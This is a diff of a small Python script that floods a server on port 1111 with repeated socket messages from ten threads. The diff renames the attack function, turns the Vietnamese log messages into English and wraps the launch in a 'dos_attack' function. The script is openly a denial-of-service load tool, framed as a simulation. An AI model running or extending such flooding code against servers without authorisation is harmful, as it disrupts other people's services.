@@ -8,8 +8,8 @@ SERVER_PORT = 1111
 THREADS_COUNT = 10
 REQUESTS_PER_THREAD = 50 
 
-def attack_simulation(thread_id):
-    print(f"[Thread {thread_id}] Bắt đầu gửi dữ liệu...")
+def dos_thread_task(thread_id):
+    print(f"[Thread {thread_id}] Starting transmission...")
     try:
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.settimeout(5)
@@ -25,22 +25,27 @@ def attack_simulation(thread_id):
             try:
                 client.sendall(message.encode('utf-8'))
             except Exception as e:
-                print(f"[Thread {thread_id}] Bị Server ngắt kết nối ở request thứ {i}: {e}")
+                print(f"[Thread {thread_id}] Disconnected at request {i}: {e}")
                 break
                 
             time.sleep(0.01) 
             
         client.close()
     except Exception as e:
-        print(f"[Thread {thread_id}] Không thể kết nối hoặc bị chặn ngay lập tức: {e}")
+        print(f"[Thread {thread_id}] Connection failed or blocked: {e}")
 
-threads = []
-for i in range(THREADS_COUNT):
-    t = threading.Thread(target=attack_simulation, args=(i,))
-    threads.append(t)
-    t.start()
+def dos_attack():
+    print("\n--- DOS ATTACK ---")
+    threads = []
+    for i in range(THREADS_COUNT):
+        t = threading.Thread(target=dos_thread_task, args=(i,))
+        threads.append(t)
+        t.start()
 
-for t in threads:
-    t.join()
+    for t in threads:
+        t.join()
 
-print("Hoàn tất kiểm thử.")
+    print("[INFO] DoS Attack simulation complete.")
+
+if __name__ == "__main__":
+    dos_attack()
